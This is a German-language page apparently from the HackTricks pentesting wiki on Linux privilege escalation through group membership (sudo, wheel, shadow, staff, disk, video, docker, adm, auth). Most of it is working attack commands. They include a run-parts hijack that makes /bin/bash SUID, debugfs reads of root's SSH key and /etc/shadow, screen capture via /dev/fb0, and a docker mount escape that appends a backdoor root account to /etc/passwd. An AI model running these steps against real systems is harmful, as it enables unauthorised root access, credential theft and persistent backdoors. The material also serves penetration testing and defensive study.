# Interessante Gruppen - Linux Privesc

{% hint style="success" %}
Lernen Sie und üben Sie AWS-Hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen Sie und üben Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys senden.

</details>
{% endhint %}

## Sudo/Admin-Gruppen

### **PE - Methode 1**

**Manchmal** finden Sie **standardmäßig (oder weil einige Software dies benötigt)** in der Datei **/etc/sudoers** einige dieser Zeilen:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Dies bedeutet, dass **jeder Benutzer, der zur Gruppe sudo oder admin gehört, alles als sudo ausführen kann**.

Wenn dies der Fall ist, können Sie einfach Folgendes ausführen, um **Root zu werden**:
```
sudo su
```
### PE - Methode 2

Finde alle suid-Binärdateien und überprüfe, ob die Binärdatei **Pkexec** vorhanden ist:
```bash
find / -perm -4000 2>/dev/null
```
Wenn Sie feststellen, dass das Binärprogramm **pkexec ein SUID-Binärprogramm** ist und Sie zur Gruppe **sudo** oder **admin** gehören, könnten Sie wahrscheinlich Binärdateien als sudo mit `pkexec` ausführen. Dies liegt daran, dass dies in der Regel die Gruppen innerhalb der **polkit-Richtlinie** sind. Diese Richtlinie identifiziert im Grunde genommen, welche Gruppen `pkexec` verwenden können. Überprüfen Sie dies mit:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Dort finden Sie, welche Gruppen berechtigt sind, **pkexec** auszuführen, und **standardmäßig** erscheinen in einigen Linux-Distributionen die Gruppen **sudo** und **admin**.

Um **Root zu werden, können Sie ausführen**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Wenn Sie versuchen, **pkexec** auszuführen und diesen **Fehler** erhalten:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Es liegt nicht daran, dass Sie keine Berechtigungen haben, sondern dass Sie ohne eine grafische Benutzeroberfläche nicht verbunden sind**. Und es gibt hier eine Lösung für dieses Problem: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Sie benötigen **2 verschiedene SSH-Sitzungen**:

{% code title="Sitzung1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="Sitzung2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Wheel-Gruppe

**Manchmal** finden Sie standardmäßig in der Datei **/etc/sudoers** diese Zeile:
```
%wheel	ALL=(ALL:ALL) ALL
```
Das bedeutet, dass **jeder Benutzer, der zur Gruppe wheel gehört, alles als sudo ausführen kann**.

Wenn dies der Fall ist, können Sie einfach **root werden, indem Sie Folgendes ausführen**:
```
sudo su
```
## Shadow-Gruppe

Benutzer der **Gruppe shadow** können die Datei **/etc/shadow** **lesen**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, lesen Sie die Datei und versuchen Sie, **einige Hashes zu knacken**.

## Mitarbeitergruppe

**staff**: Ermöglicht Benutzern, lokale Änderungen am System (`/usr/local`) ohne Root-Rechte hinzuzufügen (beachten Sie, dass ausführbare Dateien in `/usr/local/bin` im PATH-Variable jedes Benutzers enthalten sind und sie die ausführbaren Dateien in `/bin` und `/usr/bin` mit demselben Namen "überschreiben" können). Vergleichen Sie mit der Gruppe "adm", die mehr mit Überwachung/Sicherheit zu tun hat. [\[Quelle\]](https://wiki.debian.org/SystemGroups)

In Debian-Distributionen zeigt die `$PATH`-Variable an, dass `/usr/local/` mit höchster Priorität ausgeführt wird, unabhängig davon, ob Sie ein privilegierter Benutzer sind oder nicht.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Wenn wir einige Programme in `/usr/local` übernehmen können, können wir leicht Root-Zugriff erhalten.

Das Übernehmen des Programms `run-parts` ist ein einfacher Weg, um Root-Zugriff zu erhalten, da die meisten Programme ein `run-parts` ähnliches Programm ausführen werden (z. B. Crontab, wenn eine SSH-Anmeldung erfolgt).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
oder wenn eine neue SSH-Sitzung angemeldet wird.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Ausnutzen**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Festplattengruppe

Dieses Privileg ist fast **äquivalent zu Root-Zugriff**, da Sie auf alle Daten innerhalb der Maschine zugreifen können.

Dateien: `/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Beachten Sie, dass Sie mit debugfs auch **Dateien schreiben** können. Zum Beispiel können Sie `/tmp/asd1.txt` nach `/tmp/asd2.txt` kopieren:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Jedoch, wenn Sie versuchen, **Dateien zu schreiben, die root gehören** (wie `/etc/shadow` oder `/etc/passwd`), erhalten Sie einen "**Permission denied**" Fehler.

## Video-Gruppe

Mit dem Befehl `w` können Sie herausfinden, **wer im System angemeldet ist** und es wird eine Ausgabe wie die folgende angezeigt:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Die **tty1** bedeutet, dass der Benutzer **yossi physisch an einem Terminal auf dem Rechner angemeldet ist**.

Die **Video-Gruppe** hat Zugriff, um die Bildschirmausgabe anzuzeigen. Grundsätzlich kannst du die Bildschirme beobachten. Um das zu tun, musst du **das aktuelle Bild auf dem Bildschirm erfassen** und die Auflösung, die der Bildschirm verwendet, erhalten. Die Bilddaten des Bildschirms können in `/dev/fb0` gespeichert werden und du könntest die Auflösung dieses Bildschirms in `/sys/class/graphics/fb0/virtual_size` finden.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Um das **Rohbild** zu **öffnen**, können Sie **GIMP** verwenden, wählen Sie die Datei \*\*`screen.raw` \*\* und wählen Sie als Dateityp **Rohbilddaten** aus:

![](<../../../.gitbook/assets/image (463).png>)

Ändern Sie dann die Breite und Höhe auf die auf dem Bildschirm verwendeten und überprüfen Sie verschiedene Bildtypen (und wählen Sie denjenigen aus, der den Bildschirm am besten darstellt):

![](<../../../.gitbook/assets/image (317).png>)

## Root-Gruppe

Es scheint, dass standardmäßig **Mitglieder der Root-Gruppe** auf einige **Dienstkonfigurationsdateien** oder einige **Bibliotheksdateien** oder **andere interessante Dinge** zugreifen können, die zur Eskalation von Berechtigungen verwendet werden könnten...

**Überprüfen Sie, welche Dateien Root-Mitglieder ändern können**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker-Gruppe

Sie können **das Wurzeldateisystem des Hostcomputers an das Volume einer Instanz anhängen**, sodass beim Start der Instanz sofort ein `chroot` in dieses Volume geladen wird. Dies gibt Ihnen effektiv Root-Zugriff auf den Computer.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
## lxc/lxd Gruppe

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Adm Gruppe

Normalerweise haben **Mitglieder** der Gruppe **`adm`** Berechtigungen, um Protokolldateien im Verzeichnis _/var/log/_ zu **lesen**.\
Daher sollten Sie, wenn Sie einen Benutzer in dieser Gruppe kompromittiert haben, definitiv einen **Blick auf die Protokolle** werfen.

## Auth Gruppe

Innerhalb von OpenBSD kann die **auth** Gruppe normalerweise in die Verzeichnisse _**/etc/skey**_ und _**/var/db/yubikey**_ schreiben, wenn sie verwendet werden.\
Diese Berechtigungen können mit dem folgenden Exploit zum **Privilegieneskalation** auf root missbraucht werden: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
